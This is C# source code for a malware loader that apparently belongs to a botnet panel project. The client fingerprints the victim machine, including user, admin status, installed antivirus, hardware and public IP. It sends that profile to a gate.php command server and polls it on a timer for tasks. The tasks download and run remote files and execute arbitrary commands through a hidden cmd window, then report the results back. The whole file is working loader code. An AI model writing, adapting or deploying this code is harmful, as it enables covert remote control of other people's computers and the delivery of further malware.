using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Management;
using System.Threading;
using System.Security.Principal;
using System.DirectoryServices;
using TinyJson;

namespace app
{
    class app
    {
        // Loader version
        public static string version = "1.0.4";

        // Server
        public static string server = "http://localhost/avatar-beta/server/gate.php";

        // Path for download files
        public static string defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        // Interval between knocks in seconds
        public static int interval = 240;

        // How many times repeat failed task
        public static int attemptsCount = 3; 

        // Collecting PC information
        public static Dictionary<string,string> clientInfo = GetClientInfo();

        // Status of running loader
        public static string status = "Active";

        static void Main(string[] args)
        {
            while (status == "Active")
            {
                DoTasks(SendClientInfo());

                Thread.Sleep(interval * 1000);

                DoTasks(SendKnock());
            }
            Console.ReadLine();
        }

        public static string SendClientInfo()
        {
            Console.Write("[INFO] Sending collected information... ");
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(server);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Headers.Add("mode", "info");
            httpWebRequest.Headers.Add("uuid", clientInfo["uuid"]);
            httpWebRequest.Headers.Add("version", version);
            httpWebRequest.Method = "POST";
            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                streamWriter.Write(clientInfo.ToJson());
            }
            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            StreamReader streamReader = new StreamReader(httpResponse.GetResponseStream());
            var response = streamReader.ReadToEnd().Trim();
            Console.WriteLine("Response: " + response.Trim());
            return response;
        }

        public static string SendKnock()
        {
            Console.Write("[INFO] Knocking... ");
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(server);
            httpWebRequest.Accept = "application/json";
            httpWebRequest.Headers.Add("mode", "knock");
            httpWebRequest.Headers.Add("uuid", clientInfo["uuid"]);
            httpWebRequest.Headers.Add("version", version);
            httpWebRequest.Method = "POST";
            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            StreamReader streamReader = new StreamReader(httpResponse.GetResponseStream());
            var response = streamReader.ReadToEnd().Trim();
            Console.WriteLine("Response: " + response.Trim());
            return response;
        }

        public static void SendTaskResult(string taskID, string result, string details)
        {
            Console.Write("[INFO] Sending " + (result == "True" ? "completed" : "failed!") + " task #" + taskID + "... ");
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(server);
            httpWebRequest.Headers.Add("mode", "task");
            httpWebRequest.Headers.Add("version", version);
            httpWebRequest.Headers.Add("uuid", clientInfo["uuid"]);
            httpWebRequest.Headers.Add("task_id", taskID);
            httpWebRequest.Headers.Add("result", result);
            httpWebRequest.Headers.Add("details", details);
            httpWebRequest.Method = "POST";
            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            StreamReader streamReader = new StreamReader(httpResponse.GetResponseStream());
            var response = streamReader.ReadToEnd();
            Console.WriteLine("Response:" + response.Trim());
        }

        public static void DoTasks(string tasksJson)
        {
            if (tasksJson.Length < 5)
            {
                Console.WriteLine("[INFO] No new tasks");
                return;
            };

            List<Dictionary<string, string>> tasks = new List<Dictionary<string, string>>();
            var result = false;
            var attempts = 0;
            var details = "";

            try
            {
                tasks = tasksJson.FromJson<List<Dictionary<string, string>>>();
            }
            catch
            {
                Console.WriteLine("[ERROR] Parse JSON tasks failed!");
                return;
            };
            Console.WriteLine("[INFO] Detected " + tasks.Count + " tasks");
            foreach (Dictionary<string, string> task in tasks)
            {
                result = false;
                attempts = attemptsCount;
                
                Console.WriteLine("[INFO] Start task #" + task["id"]);
                while ( (attempts > 0) && (result != true) )
                {
                    switch (task["type"])
                    {
                        case "Download & Execute":
                            result = Download(task["content"]);
                            if (result == false)
                            {
                                details = "Error: download file failed";
                                break;
                            } else
                            {
                                result = Execute(defaultPath + "\\" + GetFilenameFromURL(task["content"]));
                                if (result == false)
                                    details = "Error: executing downloaded file failed";
                            }
                            break;
                        case "Execute":
                            result = Execute(task["content"]);
                            if (result == false)
                                details = "Error: executing file failed";
                            break;
                        case "Terminate":
                            status = "Stopped";
                            result = true;
                            break;
                        default:
                            result = false;
                            details = "Error: unknown task type";
                            break;
                    }
                    if (result == false)
                        attempts--;
                    else
                        details = "Success";
                    SendTaskResult(task["id"], result.ToString(), details);
                }
            }
        }

        public static bool Execute(string command)
        {
            try
            {
                ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                {
                    WorkingDirectory = defaultPath,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Console.WriteLine("[INFO] Executing <" + command + ">‎...");
                using (Process proc = new Process())
                {
                    proc.StartInfo = procStartInfo;
                    proc.Start();
                }
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[ERROR] Executing failed! ", e);
                return false;
            }
        }

        public static string GetFilenameFromURL(string url)
        {
            var filename = url.Split('/')[url.Split('/').Length-1];
            return filename;
        }

        public static bool Download(string url)
        {
            var filename = GetFilenameFromURL(url);
            try
            {
                Console.WriteLine("[INFO] Downloading <" + filename + ">‎...");
                WebClient webClient = new WebClient();
                webClient.DownloadFile(url, defaultPath + "\\" + filename);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[ERROR] Downloading failed! ", e);
                return false;
            }
        }

        public static Dictionary<string, string> GetClientInfo()
        {
            Console.WriteLine("[INFO] Collecting PC information...");
            Dictionary<string, string> initInfo = new Dictionary<string, string>();

            // Retrieve UUID
            foreach (ManagementObject uuidObject in new ManagementObjectSearcher("\\\\localhost\\root\\CIMV2", "SELECT UUID FROM Win32_ComputerSystemProduct").Get())
                initInfo["uuid"] = uuidObject["UUID"].ToString();

            // Retrieve client IP
            initInfo["ip"] = new WebClient().DownloadString("http://ipinfo.io/ip").Trim();

            // Retrieve country
            initInfo["location"] = new WebClient().DownloadString("http://ipinfo.io/country").Trim();

            // Retrieve OS name
            foreach (ManagementObject osObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
                initInfo["os"] = osObject["Caption"].ToString().Trim();

            // Retrieve User name
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            initInfo["user"] = WindowsIdentity.GetCurrent().Name;

            // Retrieve user role
            var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            initInfo["role"] = admin ? "Admin" : "User";

            // Retrieve antivirus info
            foreach (ManagementObject avObject in new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get())
                initInfo["antivirus"] = avObject["displayName"].ToString();
            
            // Retrieve CPU name
            foreach (ManagementObject cpuObject in new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get())
                initInfo["cpu"] = cpuObject["Name"].ToString().Trim();

            // Retrieve GPU name
            foreach (ManagementObject gpuObject in new ManagementObjectSearcher("SELECT * FROM Win32_VideoController").Get())
                initInfo["gpu"] = gpuObject["Name"].ToString().Trim();

            // Retrieve RAM
            foreach (ManagementObject ramObject in new ManagementClass("Win32_ComputerSystem").GetInstances())
                initInfo["ram"] = Convert.ToString(Math.Round(Convert.ToDouble(ramObject.Properties["TotalPhysicalMemory"].Value) / 1048576, 0)) + " MB";

            // Retrieve total storage space
            long available = 0;
            long total = 0;
            foreach (DriveInfo drive in DriveInfo.GetDrives())
                if (drive.IsReady)
                {
                    total += (drive.TotalSize / 1024 / 1024 / 1024);
                    available += (drive.TotalFreeSpace / 1024 / 1024 / 1024);
                }
            initInfo["storage"] = available.ToString() + " / " + total.ToString() + " GB";

            // Retrieve count of PC in network
            var pcs = 0;
            foreach (DirectoryEntry computers in new DirectoryEntry("WinNT:").Children)
                foreach (DirectoryEntry computer in computers.Children)
                    if ( (computer.Name != "Schema") && (computer.SchemaClassName == "Computer") )
                        pcs++;
            initInfo["network"] = pcs.ToString();

            // Retrieve loader version
            initInfo["version"] = version;

            return initInfo;
        }
    }
}
